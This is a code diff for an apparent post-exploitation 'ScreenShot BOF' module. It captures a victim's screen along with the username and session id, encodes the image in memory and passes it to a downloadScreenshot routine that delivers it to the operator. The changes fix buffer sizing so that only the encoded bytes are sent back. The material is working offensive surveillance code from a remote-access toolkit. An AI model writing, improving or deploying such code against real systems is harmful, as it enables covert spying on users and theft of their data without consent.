@@ -105,8 +105,9 @@ int go()
     IWICBitmapEncoder* encoder = NULL;
     IWICBitmapFrameEncode* frame = NULL;
     HRESULT hr = S_OK;
-    BYTE* Memory;
-    
+    BYTE* Memory;    
+    LARGE_INTEGER pos;
+    ULARGE_INTEGER size;
     char* user = (char*)MSVCRT$getenv("USERNAME");
     char title[] = "ScreenShot BOF";
     int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
@@ -149,8 +150,8 @@ int go()
     bi.biClrUsed = 0;
     bi.biClrImportant = 0;
     dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
-    Memory = MSVCRT$malloc(500 * 1024);
-    MSVCRT$memset(Memory, 0, 500 * 1024);
+    Memory = MSVCRT$malloc(dwBmpSize/6);
+    MSVCRT$memset(Memory, 0, dwBmpSize/6);
     hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (!GDI32$GetObjectW(hbmScreen, sizeof(bm_info), &bm_info)) {
         hr = E_FAIL;
@@ -171,7 +172,7 @@ int go()
         hr = IWICImagingFactory_CreateStream(factory, &stream);
     }
     if (SUCCEEDED(hr)) {
-        hr = IWICStream_InitializeFromMemory(stream, Memory, 500 * 1024);
+        hr = IWICStream_InitializeFromMemory(stream, Memory, dwBmpSize/6);
     }
     encoder = NULL;
     if (SUCCEEDED(hr)) {
@@ -203,8 +204,10 @@ int go()
     if (SUCCEEDED(hr)) {
         hr = IWICBitmapEncoder_Commit(encoder);
     }
+    pos.QuadPart = 0;
+    IStream_Seek(stream, pos, STREAM_SEEK_CUR, &size);
     KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &session);
-    downloadScreenshot((char*)Memory, 500*1024, session, (char*)title, titleLength, (char*)user, userLength);
+    downloadScreenshot((char*)Memory, size.QuadPart, session, (char*)title, titleLength, (char*)user, userLength);
     if (frame) {
         IWICBitmapFrameEncode_Release(frame);
     }
